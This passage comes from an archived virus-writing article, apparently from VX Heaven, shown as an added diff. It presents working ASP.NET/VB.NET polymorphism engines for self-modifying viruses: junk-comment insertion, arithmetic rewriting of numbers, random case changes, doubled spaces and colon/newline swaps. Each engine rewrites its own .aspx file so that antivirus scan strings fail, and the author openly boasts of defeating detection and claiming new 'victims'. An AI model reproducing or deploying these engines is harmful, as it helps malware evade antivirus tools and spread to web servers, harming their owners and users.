+&nbsp; If which_trash = 4 Then find_trash=&quot;Rem &quot;+find_new_name(my_arr_obj.Next(10), my_arr_obj)<br/>
+&nbsp; If which_trash = 5 Then find_trash=&quot;' &quot;+find_new_name(my_arr_obj.Next(10), my_arr_obj)<br/>
+&nbsp;End Function<br/>
+&nbsp;Function find_new_name(new_name_length As Integer, my_arr_obj As Random)<br/>
+&nbsp; Dim new_var_name As String = &quot;&quot;<br/>
+&nbsp; Dim counter_i As Integer<br/>
+&nbsp; new_name_length=new_name_length+5<br/>
+&nbsp; For counter_i = 0 to new_name_length<br/>
+&nbsp; &nbsp; new_var_name=new_var_name+Chr(my_arr_obj.Next(26)+97)<br/>
+&nbsp; Next<br/>
+<br/>
+&nbsp; find_new_name=new_var_name<br/>
+&nbsp;End Function<br/>
+&nbsp;&lt;/script&gt;<br/>
+&nbsp;</div>
+<ul>
+<li>Opens itself (by static path)</li>
+<li>Reads whole own code into an array</li>
+<li>Closes itself</li>
+<li>Checks for every line if trash should be included</li>
+<li>Include 1 out of 5 trash lines</li>
+<li>Writes the code into the own file</li>
+</ul>
+<h3><a name="c33"></a>Number Changing</h3>
+<p>This is polymorphism technique which I've already done in JS, PHP and Ruby (see rRlf #5, 29a#7 and 29a#8)- but it is a real good technique, therefore I wanted to do it in ASP.NET with VB.NET too. The idea is that numbers can also be seen as calculations. That means 666 = 999-333 = 333+333 = 1332 / 2</p>
+<p>It's an easy princip - but it works fine. And it helps against simple detection of the virus. Let's see first an later calculation of a nice number, then the code of the engine:</p>
+<pre>
+666=((((6093/9)-(28/4))+(((224/7)/(5-1))-((40/1)/(9-1))))-(-((10/(14-9))-1)+((36+(28/(1+6)))/5)))
+</pre>
+<div class="html" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&lt;%@ Page Language=&quot;VB&quot; Debug=&quot;True&quot; %&gt;<br/>
+&lt;script runat=&quot;server&quot;&gt;<br/>
+Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)<br/>
+&nbsp; Dim my_file_name As String = &quot;C:\Inetpub\wwwroot\localstart.aspx&quot;<br/>
+&nbsp; Dim my_file_code, new_file_code, my_code_line, found_number As String<br/>
+&nbsp; Dim i As Integer<br/>
+&nbsp; Dim my_arr_obj As new System.Random()<br/>
+&nbsp; Dim file_pointer As New System.IO.StreamReader(my_file_name)<br/>
+&nbsp; Do<br/>
+&nbsp; &nbsp; my_code_line=file_pointer.ReadLine()<br/>
+&nbsp; &nbsp; my_file_code=my_file_code+my_code_line+Chr(13)+Chr(10)<br/>
+&nbsp; Loop Until my_code_line Is Nothing<br/>
+&nbsp; file_pointer.Close<br/>
+&nbsp; For i=1 To my_file_code.Length<br/>
+&nbsp; &nbsp; If Asc(Mid(my_file_code,i,1))&gt;47 And Asc(Mid(my_file_code,i,1))&lt;58 Then<br/>
+&nbsp; &nbsp; &nbsp; found_number=&quot;&quot;<br/>
+&nbsp; &nbsp; &nbsp; While Asc(Mid(my_file_code,i,1))&gt;47 And Asc(Mid(my_file_code,i,1))&lt;58<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; found_number=found_number+Mid(my_file_code,i,1)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; i=i+1<br/>
+&nbsp; &nbsp; &nbsp; End While<br/>
+&nbsp; &nbsp; &nbsp; new_file_code=new_file_code+get_new_num(found_number, my_arr_obj)+Mid(my_file_code,i,1)<br/>
+&nbsp; &nbsp; Else<br/>
+&nbsp; &nbsp; &nbsp; new_file_code=new_file_code+Mid(my_file_code,i,1)<br/>
+&nbsp; &nbsp; End If<br/>
+&nbsp; Next<br/>
+&nbsp; Dim file_Wpointer As New System.IO.StreamWriter(my_file_name)<br/>
+&nbsp; file_Wpointer.WriteLine(new_file_code)<br/>
+&nbsp; file_Wpointer.Close<br/>
+End Sub<br/>
+<br/>
+Function get_new_num(number As String, my_arr_obj As Random)<br/>
+&nbsp; Dim rnd_num As Integer = my_arr_obj.Next(7)<br/>
+&nbsp; Dim rnd_num_B As Integer = my_arr_obj.Next(9)+1<br/>
+&nbsp; Dim new_num As String = Str(Val(number)-rnd_num_B)<br/>
+&nbsp; If rnd_num=0 Then get_new_num=&quot;(&quot;+Str(Val(number)-rnd_num_B)+&quot;+&quot;+Str(rnd_num_B)+&quot;)&quot;<br/>
+&nbsp; If rnd_num=1 Then get_new_num=&quot;(&quot;+Str(Val(number)+rnd_num_B)+&quot;-&quot;+Str(rnd_num_B)+&quot;)&quot;<br/>
+&nbsp; If rnd_num=2 Then get_new_num=&quot;(&quot;+Str(Val(number)*rnd_num_B)+&quot;/&quot;+Str(rnd_num_B)+&quot;)&quot;<br/>
+&nbsp; If rnd_num&gt;2 Then get_new_num=number<br/>
+&nbsp; get_new_num=get_new_num.Replace(&quot; &quot;,&quot;&quot;)<br/>
+End Function<br/>
+&lt;/script&gt;<br/>
+&nbsp;</div>
+<ul>
+<li>Opens itself (by static path)</li>
+<li>Reads whole own code into an array</li>
+<li>Closes itself</li>
+<li>Searchs for every letter if it's a number Chr(47) &lt; x &lt; Chr(58)</li>
+<li>If found, search for the full number</li>
+<li>Calls a function to get a new number</li>
+<li>Use one out of tree calculations: Add, Sub, Div. It's not possible to use Mul as the code has to Div it first, and that makes commas, which will make errors in next generations.</li>
+<li>Replace the number by change of 1/4</li>
+<li>Writes new code to the file</li>
+</ul>
+<h3><a name="c34"></a>Lower/Upper Case Games</h3>
+<p>This polymorphism technique was just able to bring to reality, because I've used VB.NET. That language is NOT Case-Sensitive, (in contrast to C++.NET or C#). The idea is, that every letter can be written uppercase or lowercase. The advantage: AVers can not use simple scan strings - combined with the other techniques, this is a strong way to fuck the detection of a virus. Now the code:</p>
+<div class="html" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><br/>
+&lt;%@ Page Language=&quot;VB&quot; Debug=&quot;True&quot; %&gt;<br/>
+&lt;script runat=&quot;server&quot;&gt;<br/>
+Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)<br/>
+&nbsp; Dim my_file_name As String = &quot;C:\Inetpub\wwwroot\localstart.aspx&quot;<br/>
+&nbsp; Dim my_file_code, new_file_code, my_code_line, found_number As String<br/>
+&nbsp; Dim i As Integer<br/>
+&nbsp; Dim my_arr_obj As new System.Random()<br/>
+&nbsp; Dim file_pointer As New System.IO.StreamReader(my_file_name)<br/>
+&nbsp; Do<br/>
+&nbsp; &nbsp; my_code_line=file_pointer.ReadLine()<br/>
+&nbsp; &nbsp; my_file_code=my_file_code+my_code_line+Chr(13)+Chr(10)<br/>
+&nbsp; Loop Until my_code_line Is Nothing<br/>
+&nbsp; file_pointer.Close<br/>
+<br/>
+&nbsp; For i=1 To my_file_code.Length<br/>
+&nbsp; &nbsp; If Asc(Mid(my_file_code,i,1))&gt;64 And Asc(Mid(my_file_code,i,1))&lt;91 And my_arr_obj.Next(3)=1 Then<br/>
+&nbsp; &nbsp; &nbsp; new_file_code=new_file_code+Chr(Asc(Mid(my_file_code,i,1))+32)<br/>
+&nbsp; &nbsp; ElseIf Asc(Mid(my_file_code,i,1))&gt;96 And Asc(Mid(my_file_code,i,1))&lt;123 And my_arr_obj.Next(3)=1 Then<br/>
+&nbsp; &nbsp; &nbsp; new_file_code=new_file_code+Chr(Asc(Mid(my_file_code,i,1))-32)<br/>
+&nbsp; &nbsp; Else<br/>
+&nbsp; &nbsp; &nbsp; new_file_code=new_file_code+Mid(my_file_code,i,1)<br/>
+&nbsp; &nbsp; End If<br/>
+&nbsp; Next<br/>
+&nbsp; Dim file_Wpointer As New System.IO.StreamWriter(my_file_name)<br/>
+&nbsp; file_Wpointer.WriteLine(new_file_code)<br/>
+&nbsp; file_Wpointer.Close<br/>
+End Sub<br/>
+&lt;/script&gt;<br/>
+&nbsp;</div>
+<ul>
+<li>Opens itself (by static path)</li>
+<li>Reads whole own code into an array</li>
+<li>Closes itself</li>
+<li>Checks for each byte in the code if it's a uppercase letter</li>
+<li>If so, by a chance of 1/3: Chr(nn)+32</li>
+<li>Checks for each byte in the code if it's a lowercase letter</li>
+<li>If so, by a chance of 1/3: Chr(nn)-32</li>
+<li>Writes new code to the file</li>
+</ul>
+<h3><a name="c35"></a>Space Games</h3>
+<p>This technique uses the behaviour of VB.NET scripts, that they simply ignore multi space between commands. That means:</p>
+<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #8D38C9; font-weight: bold;">End</span> <span style="color: #E56717; font-weight: bold;">Sub</span><span style="color: #800000;">&quot; == &quot;</span> &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">End</span> &nbsp; &nbsp; &nbsp; <span style="color: #E56717; font-weight: bold;">Sub</span> &nbsp; <span style="color: #800000;">&quot;<br/>
+</span></div>
+<p>By using that technique, AVers can not use simple scan-strings again. They have to build in a function for ignoring multible spaces. And, as the other techniques too, this means more work. In combination with other techniques: The less they can detect static, the harder they have to work, and the more difficult it becomes to find a valueable detection. Now the code:</p>
+<div class="html" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&lt;%@ Page Language=&quot;VB&quot; Debug=&quot;True&quot; %&gt;<br/>
+&lt;script runat=&quot;server&quot;&gt;<br/>
+Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)<br/>
+&nbsp; Dim my_file_name As String = &quot;C:\Inetpub\wwwroot\localstart.aspx&quot;<br/>
+&nbsp; Dim my_file_code, new_file_code, my_code_line, found_number As String<br/>
+&nbsp; Dim i As Integer<br/>
+&nbsp; Dim my_arr_obj As new System.Random()<br/>
+&nbsp; Dim file_pointer As New System.IO.StreamReader(my_file_name)<br/>
+&nbsp; Do<br/>
+&nbsp; &nbsp; my_code_line=file_pointer.ReadLine()<br/>
+&nbsp; &nbsp; my_file_code=my_file_code+my_code_line+Chr(13)+Chr(10)<br/>
+&nbsp; Loop Until my_code_line Is Nothing<br/>
+&nbsp; file_pointer.Close<br/>
+<br/>
+&nbsp; For i=1 To my_file_code.Length<br/>
+&nbsp; &nbsp; If Mid(my_file_code,i,1)=Chr(32) And my_arr_obj.Next(4)=1 Then new_file_code=new_file_code+chr(32)<br/>
+&nbsp; &nbsp; new_file_code=new_file_code+Mid(my_file_code,i,1)<br/>
+&nbsp; Next<br/>
+&nbsp; Dim file_Wpointer As New System.IO.StreamWriter(my_file_name)<br/>
+&nbsp; file_Wpointer.WriteLine(new_file_code)<br/>
+&nbsp; file_Wpointer.Close<br/>
+End Sub<br/>
+&lt;/script&gt;<br/>
+&nbsp;</div>
+<ul>
+<li>Opens itself (by static path)</li>
+<li>Reads whole own code into an array</li>
+<li>Closes itself</li>
+<li>Searchs for Spaces in the own code and by change of 1/4 makes a double space</li>
+<li>Writes new code to the file</li>
+</ul>
+<h3><a name="c36"></a>Colon Games</h3>
+<p>The last polymorphism-engine I'll show you uses the character ':'. This one can be used for VB/VBS/VB.NET codes to combine 2 files without Chr(13,10). As this could be used for viruses too, i've written that engine. Sometimes the code changes Chr(13,10) to colons and sometimes the opposite. This makes the virus look quite different every version. 'Sub ... ()' and 'End Sub' have to be in the same line, and therefore the code ignores every Chr(13,10), which has a space before. (This is important if you want to copy/paste/rewrite the code.) Well, let's look at the last code of this article:</p>
+<div class="html" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&lt;%@ Page Language=&quot;VB&quot; Debug=&quot;True&quot; %&gt;<br/>
+&lt;script runat=&quot;server&quot;&gt;<br/>
+Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs) <br/>
+&nbsp; Dim my_file_name As String = &quot;C&quot;+Chr(58)+&quot;\Inetpub\wwwroot\localstart.aspx&quot;<br/>
+&nbsp; Dim my_file_code, new_file_code, my_code_line, found_number As String<br/>
+&nbsp; Dim i As Integer<br/>
+&nbsp; Dim my_arr_obj As new System.Random()<br/>
+&nbsp; Dim file_pointer As New System.IO.StreamReader(my_file_name)<br/>
+&nbsp; Do<br/>
+&nbsp; &nbsp; my_code_line=file_pointer.ReadLine()<br/>
+&nbsp; &nbsp; my_file_code=my_file_code+my_code_line+Chr(13)+Chr(10)<br/>
+&nbsp; Loop Until my_code_line Is Nothing<br/>
+&nbsp; file_pointer.Close<br/>
+<br/>
+&nbsp; new_file_code=new_file_code+Mid(my_file_code,1,1)<br/>
+&nbsp; For i=2 To my_file_code.Length<br/>
+&nbsp; &nbsp; If Mid(my_file_code,i,2)=Chr(13)+Chr(10) And my_arr_obj.Next(4)=1 Then<br/>
+&nbsp; &nbsp; &nbsp; If Mid(my_file_code,i-1,1)&lt;&gt;&quot;&gt;&quot; And Mid(my_file_code,i-1,1)&lt;&gt;&quot; &quot; Then<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; new_file_code=new_file_code+chr(58)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; i=i+1<br/>
+&nbsp; &nbsp; &nbsp; Else<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; new_file_code=new_file_code+Mid(my_file_code,i,1)<br/>
+&nbsp; &nbsp; &nbsp; End If<br/>
+&nbsp; &nbsp; ElseIf Mid(my_file_code,i,1)=Chr(58) and my_arr_obj.Next(4)=1 Then<br/>
+&nbsp; &nbsp; &nbsp; new_file_code=new_file_code+Chr(13)+Chr(10)<br/>
+&nbsp; &nbsp; Else<br/>
+&nbsp; &nbsp; &nbsp; new_file_code=new_file_code+Mid(my_file_code,i,1)<br/>
+&nbsp; &nbsp; End If<br/>
+&nbsp; Next<br/>
+&nbsp; Dim file_Wpointer As New System.IO.StreamWriter(my_file_name)<br/>
+&nbsp; file_Wpointer.WriteLine(new_file_code)<br/>
+&nbsp; file_Wpointer.Close <br/>
+End Sub&lt;/script&gt;<br/>
+&nbsp;</div>
+<ul>
+<li>Opens itself (by static path)</li>
+<li>Reads whole own code into an array</li>
+<li>Closes itself</li>
+<li>Searchs for Chr(13)+Chr(10) in the code</li>
+<li>If Mid(string,i,-1) &lt;> space and by chance of 1/4 replace it to a collon</li>
+<li>Searchs for collons in the code</li>
+<li>By chance of 1/4 replace it to Chr(13)+Chr(10)</li>
+<li>Writes new code to the file</li>
+</ul>
+<h2><a name="c4"></a>Last words</h2>
+<p>Another file-type is ready for infection since this article. I'm happy that I've finally finished it, and that Microsoft's answere to PHP is on the list of my victims now, too. :) I have already mentioned at the beginning of the article, you could write ASP.NET viruses with C# or C++.NET too, but I think for this time it's ok. About ASP.NET: It's really a highly interesting language, has alot of interesting feature for 'real' coding, is very easy to handle client and server communication and can use the whole appility of the .NET Framework. For this time - it's enough. See you out there soon! :D</p>
+<p>PS: We need new heros! Read this: <a href="http://vxer.org/29a/29a-6/29a-6.111">http://vxer.org/29a/29a-6/29a-6.111</a></p>
+[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp29">Back to index</a>] [<a href="/lib/vsp29.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsp29">de</a><a href="/lib/index.php?lang=en&amp;id=vsp29">en</a><a href="/lib/index.php?lang=es&amp;id=vsp29">es</a><a href="/lib/index.php?lang=it&amp;id=vsp29">it</a><a href="/lib/index.php?lang=fr&amp;id=vsp29">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsp29">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsp29">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsp29">ua</a></div>
+</body>
+</html>
